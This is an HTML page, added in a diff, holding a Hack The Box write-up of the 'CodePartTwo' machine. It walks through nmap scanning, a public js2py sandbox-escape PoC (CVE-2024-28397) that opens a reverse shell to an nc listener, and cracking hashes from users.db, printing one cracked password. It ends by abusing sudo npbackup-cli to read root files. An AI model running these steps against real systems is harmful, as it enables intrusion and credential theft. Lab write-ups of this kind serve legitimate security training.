@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CodePartTwo &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/CodePartTwo/9f7fc279-ccc7-4d3a-a99b-02aeab299881.png" alt="CodePartTwo machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>CodePartTwo</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
+      <span class="badge">js2py</span>
+      <span class="badge">CVE-2024-28397</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User Access</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+  </ul>
+</nav>
+
+<blockquote class="callout">
+  <div class="callout-title">Key takeaways</div>
+  <ul>
+    <li><strong>Vulnerable <code>js2py</code> module</strong> &rarr; <strong>CVE-2024-28397 sandbox escape gives a reverse shell</strong></li>
+    <li><strong>Credentials in <code>users.db</code></strong> &rarr; <strong>cracked hash gives SSH access</strong></li>
+    <li><strong><code>sudo npbackup-cli</code></strong> &rarr; <strong>a custom config backs up <code>/root</code></strong></li>
+  </ul>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>We start with normal enumeration.</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.82</div>
+<p>We find two open ports.</p>
+<ul>
+  <li>Port <code>22</code> SSH</li>
+  <li>Port <code>8000</code> HTTP</li>
+</ul>
+<p>We visit the HTTP port <code>8000</code> and see this.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/CodePartTwo/Pasted image 20260110232732.png" alt="The web application on port 8000" loading="lazy">
+  <figcaption>The web application on port 8000</figcaption>
+</figure>
+<p>If we click <code>DOWNLOAD APP</code>, we can see the <code>requirement.txt</code> file. It contains:</p>
+<ul>
+  <li><code>flask==3.0.3</code></li>
+  <li><code>flask-sqlalchemy==3.1.1</code></li>
+  <li><code>js2py==0.74</code></li>
+</ul>
+<p>There is an RCE vulnerability for <code>js2py</code>: <code>CVE-2024-28397</code>. I found this <a href="https://github.com/0xDTC/js2py-Sandbox-Escape-CVE-2024-28397-RCE/blob/master/exploit.sh">PoC</a>, but we cannot use it yet.</p>
+
+<h2 id="foothold">Foothold</h2>
+<p>To continue, we register and create a new account. After we log in, we find a code editor that runs JS.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/CodePartTwo/Pasted image 20260110232816.png" alt="The JS code editor after logging in" loading="lazy">
+  <figcaption>The JS code editor after logging in</figcaption>
+</figure>
+<p>If we check the request with Burp, we see that <code>RUN CODE</code> sends a <code>POST</code> request to <code>/run_code</code>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/CodePartTwo/Pasted image 20260110233058.png" alt="Burp request: POST to /run_code" loading="lazy">
+  <figcaption>Burp request: POST to /run_code</figcaption>
+</figure>
+<p>Now we can combine these two pieces of information.</p>
+<div class="terminal-box">$ chmod + x exploit.sh
+
+## Open netcat on a different terminal. 'nc -lvnp 9001'
+
+$ ./exploit.sh 
+Target URL: http://10.10.11.82:8000/run_code
+Your IP: My_IP
+Your Port: 9001</div>
+<p>Back in the <code>nc</code> terminal, we have a reverse shell. We upgrade it:</p>
+<div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# ctrl + Z
+
+stty raw -echo
+
+fg
+
+reset
+
+screen
+
+export TERM=xterm
+
+export SHELL=bash
+
+stty rows 40 columns 100</div>
+<p>Now we have a full interactive terminal.</p>
+
+<h2 id="user">User Access</h2>
+<p>In the <code>~/app/instance</code> directory there is a <code>users.db</code> file. In it, we find a hashed password for each user.</p>
+<div class="terminal-box">app@codeparttwo:~/app/instance$ sqlite3 users.db 
+
+sqlite&gt; .tables
+code_snippet  user  
+
+sqlite&gt; SELECT * FROM user;
+1|marco|[REDACTED]
+2|app|[REDACTED]</div>
+<p>On <a href="https://crackstation.net/">crackstation</a> we crack the hashes and find the password.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">marco</span> : <span class="pass">sweetangelbabylove</span></code>
+</fieldset>
+<p>Now we use SSH to log in with these credentials.</p>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h2 id="privesc">Privilege Escalation</h2>
+<p>For root, we run <code>sudo -l</code> and find that our user can run this command:</p>
+<div class="terminal-box">(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli</div>
+<p>There is a file named <code>npbackup.conf</code>. We copy it and rename the copy to <code>test.conf</code>.</p>
+<p>Inside the configuration file, we make this change:</p>
+<div class="terminal-box">- /home/app/app/   --To this--&gt;    /root</div>
+<p>Now we are ready to create the backup:</p>
+<div class="terminal-box">sudo npbackup-cli -c test.conf -b -f
+
+# -c : configuration file
+# -b : Run a backup
+# -f : Force running a backup regardless of existing backups age</div>
+<p>Then we read the root flag.</p>
+<div class="terminal-box">sudo npbackup-cli -c test.conf --dump /root/root.txt</div>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+</div>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
+</body>
+</html>
